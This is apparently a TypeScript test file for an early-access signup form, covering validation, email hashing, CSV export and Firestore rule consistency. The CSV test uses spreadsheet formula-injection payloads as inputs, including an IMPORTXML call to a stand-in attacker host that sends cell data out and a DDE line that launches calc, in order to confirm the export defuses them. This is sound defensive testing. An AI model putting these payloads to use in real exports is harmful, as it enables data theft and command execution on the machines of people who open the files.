import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { applicationId, cleanApplication, csvCell, EMPTY_INPUT, FREQUENCY_OPTIONS, InvalidApplication, LIMITS, normalizeEmail, OS_OPTIONS, shortReference, TOOL_OPTIONS, USE_OPTIONS, type ApplicationInput } from '../lib/early-access';

const good: ApplicationInput = { ...EMPTY_INPUT, name: '  Ada Lovelace ', email: ' Ada@Example.COM ', organization: 'Analytical Engines', role: 'Engineer', os: ['windows', 'linux'], tools: ['claude-code', 'codex'], useCases: ['approvals', 'monitoring'], useCasesNote: 'Mostly reviews', frequency: 'daily', challenge: 'Knowing what ran', why: 'I run agents all day', privacyAccepted: true, marketingConsent: false };
const fields = (fn: () => unknown) => { try { fn(); } catch (e) { if (e instanceof InvalidApplication) return e.fields; throw e; } return {}; };

describe('cleanApplication', () => {
  it('trims, lower-cases the email, de-duplicates lists and drops empty optionals', () => {
    const a = cleanApplication({ ...good, os: ['windows', 'windows', 'linux'], organization: '   ', osOther: 'ignored: other not chosen' }, 'page');
    expect(a).toEqual({ name: 'Ada Lovelace', email: 'ada@example.com', role: 'Engineer', os: ['windows', 'linux'], tools: ['claude-code', 'codex'], useCases: ['approvals', 'monitoring'], useCasesNote: 'Mostly reviews', frequency: 'daily', challenge: 'Knowing what ran', why: 'I run agents all day', privacyAccepted: true, marketingConsent: false, source: 'page' });
    expect('organization' in a).toBe(false);
    expect('osOther' in a).toBe(false);
  });
  it('names every missing or wrong field, by step and as a whole', () => {
    expect(fields(() => cleanApplication({ ...EMPTY_INPUT }, 'popup', 1))).toEqual({ name: 'Enter your name.', email: 'Enter your email address.' });
    expect(fields(() => cleanApplication({ ...good, email: 'not an address' }, 'popup', 1)).email).toMatch(/does not look like/);
    expect(fields(() => cleanApplication({ ...good, os: [], tools: [], frequency: '' }, 'popup', 2))).toEqual({ os: 'Choose at least one operating system.', tools: 'Choose at least one, or "None yet".', frequency: 'Choose how often you use AI coding agents.' });
    expect(fields(() => cleanApplication({ ...good, tools: ['other'], toolsOther: '' }, 'popup', 2)).toolsOther).toBe('Name the other tools.');
    expect(fields(() => cleanApplication({ ...good, os: ['amiga'] }, 'popup', 2)).os).toBe('Choose from the options listed.');
    expect(fields(() => cleanApplication({ ...good, useCases: [], privacyAccepted: false }, 'popup', 3))).toEqual({ useCases: 'Choose at least one.', privacyAccepted: 'Please read the privacy notice and tick the box to apply.' });
    const all = fields(() => cleanApplication({ ...EMPTY_INPUT }, 'popup', 'all'));
    expect(Object.keys(all).sort()).toEqual(['email', 'frequency', 'name', 'os', 'privacyAccepted', 'tools', 'useCases']);
    // A step check does not complain about later steps.
    expect(fields(() => cleanApplication({ ...EMPTY_INPUT, name: 'x', email: 'x@y.zz' }, 'popup', 1))).toEqual({});
  });
  it('refuses over-long text with the limit named', () => {
    expect(fields(() => cleanApplication({ ...good, name: 'n'.repeat(LIMITS.name + 1) }, 'page', 1)).name).toContain(String(LIMITS.name));
    expect(fields(() => cleanApplication({ ...good, why: 'w'.repeat(LIMITS.why + 1) }, 'page', 3)).why).toContain(String(LIMITS.why));
    expect(() => cleanApplication({ ...good, why: 'w'.repeat(LIMITS.why) }, 'page')).not.toThrow();
  });
  it('keeps the marketing consent separate and never defaults it on', () => {
    expect(EMPTY_INPUT.marketingConsent).toBe(false);
    expect(cleanApplication({ ...good, marketingConsent: true }, 'popup').marketingConsent).toBe(true);
  });
});

describe('application identity', () => {
  it('is the SHA-256 of the lower-cased, trimmed address, as lower-case hex', async () => {
    const id = await applicationId('  Ada@Example.COM ');
    expect(id).toBe(createHash('sha256').update('ada@example.com').digest('hex'));
    expect(id).toMatch(/^[0-9a-f]{64}$/);
    expect(await applicationId('ada@example.com')).toBe(id);
    expect(normalizeEmail(' Ada@Example.COM ')).toBe('ada@example.com');
  });
  it('gives a short reference people can quote', () => {
    expect(shortReference('ab12cd34ef')).toBe('AOT-AB12CD');
  });
});

describe('the CSV export', () => {
  it('quotes every cell, doubles quotes, and defuses anything a spreadsheet would run as a formula', () => {
    expect(csvCell('Ada "Countess" Lovelace')).toBe('"Ada ""Countess"" Lovelace"');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell('=IMPORTXML("https://attacker.example/?"&C2,"//a")')).toBe('"\'=IMPORTXML(""https://attacker.example/?""&C2,""//a"")"');
    for (const c of ['+', '-', '@']) expect(csvCell(`${c}cmd|' /C calc'!A0`)).toMatch(/^"'/);
    expect(csvCell('\t=1+1')).toBe('"\' =1+1"'); // a leading tab or space does not hide a formula
    expect(csvCell('a\r\nb')).toBe('"a b"');
    expect(csvCell('plain name')).toBe('"plain name"');
  });
});

describe('the rules agree with the form', () => {
  const rules = readFileSync(new URL('../../../firestore.rules', import.meta.url), 'utf8');
  it('lists the same options for every choice', () => {
    for (const [list, name] of [[OS_OPTIONS, 'os'], [TOOL_OPTIONS, 'tools'], [USE_OPTIONS, 'useCases']] as const) {
      const ids = list.map(([id]) => `'${id}'`).join(', ');
      expect(rules, name).toContain(`inList(d.${name}, [${ids}])`);
    }
    expect(rules).toContain(`d.frequency in [${FREQUENCY_OPTIONS.map(([id]) => `'${id}'`).join(', ')}]`);
  });
  it('uses the same length limits', () => {
    for (const [field, max] of [['name', LIMITS.name], ['email', LIMITS.email], ['organization', LIMITS.organization], ['role', LIMITS.role], ['osOther', LIMITS.other], ['toolsOther', LIMITS.other], ['useCasesNote', LIMITS.note], ['challenge', LIMITS.challenge], ['why', LIMITS.why]] as const) {
      expect(rules, field).toContain(`shortString(d.${field}, ${max})`);
    }
  });
  it('keeps the invitation and membership rules that make access invitation-only', () => {
    for (const must of ['function redeemable(', 'function redemption(', 'getAfter(/databases/$(database)/documents/invites/', "after.status == 'redeemed' && after.redeemedBy == request.auth.uid", 'inviteAfter(d.inviteId).redeemedAt == request.time', 'function canUseAccount(uid) { return isOwner(uid) && (isActiveMember() || isAdmin()); }', 'match /admins/{uid} {', 'allow get: if isOwner(uid);']) expect(rules).toContain(must);
    // Nobody writes /admins or edits /audit from a browser.
    const admins = rules.slice(rules.indexOf('match /admins/{uid}'), rules.indexOf('match /admins/{uid}') + 200);
    expect(admins).not.toMatch(/allow (create|update|write|delete)/);
    const audit = rules.slice(rules.indexOf('match /audit/{id}'), rules.indexOf('match /audit/{id}') + 300);
    expect(audit).not.toMatch(/allow (update|delete|write)/);
  });
});
